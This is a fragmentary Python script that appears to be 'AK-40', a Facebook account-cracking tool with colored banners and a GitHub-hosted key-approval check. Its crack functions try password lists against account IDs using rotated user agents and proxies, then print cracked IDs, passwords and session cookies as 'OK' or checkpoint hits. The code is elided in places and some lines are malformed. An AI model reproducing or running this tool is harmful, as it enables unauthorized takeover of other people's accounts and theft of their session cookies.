...
prinCP=[]
try:
    prox= requests.get('https://github.com/AK-40/AK-40-king/blob/main/prox.txt').text
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/groups/517746880494588/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
║\033[0;91m /$$__  $$| $$  /$$/     \033[0;92m     \033[0;91m| $$  | $$ /$$$_  $$ b  \033[0;92m             ║
║\033[0;91m| $$  \ $$| $$ /$$/    \033[0;92m/$$$$$$\033[0;91m| $$  | $$| $$$$\ $$    \033[0;92m             ║
║\033[0;91m| $$$$$$$$| $$$$$/    \033[0;92m|______/\033[0;91m| $$$$$$$$| $$ $$ $$  \033[0;92m               ║
║\033[0;91m| $$__  $$| $$  $$   \033[0;92m         \033[0;91m|_____  $$| $$\ $$$$     \033[0;92m            ║
║\033[0;91m| $$  | $$| $$\  $$  \033[0;92m         \033[0;91m|_____  $$| $$\ $$$$       \033[0;92m          ║      
║\033[0;91m| $$  | $$| $$ \  $$ \033[0;92m         \033[0;91m      | $$| $$ \ $$$       \033[0;92m          ║
║\033[0;91m|__/  |__/|__/  \__/ \033[0;92m         \033[0;91m      | $$|  $$$$$$/       \033[0;92m          ║
║\033[0;91m                     \033[0;92m         \003[0:91m      |__/ \______/         \033[0;92m         ║      
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m L-S\033[1;91m-\033[1;92mAjmir\033[1;91m-\033[1;92mHossain\033[1;91m-\033[1;92mBRO\033[1;91m|
\033[1;91m[\033[1;92m+\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mL-S\033[1;91m-\033[1;92mAK-40 \033[1;91m|
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/AK-40/AK-40-king/blob/main/approval.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Kay : "+id)
      ...
      os.system("python AK-40-6-4V.py")
...
def setting():
    ...
    #os.system("xdg-open https://www.facebom/Ajmir.Hossain.008")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[AK-40-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
           ...
           'user-agent': 'pro',
           'viewport-width': '980',}  
           in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAK-40-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAK-40-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🌺]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print(f'\033[38;5;196m────────────────────────────────────────────────\033[1;37m')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[AK-40-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
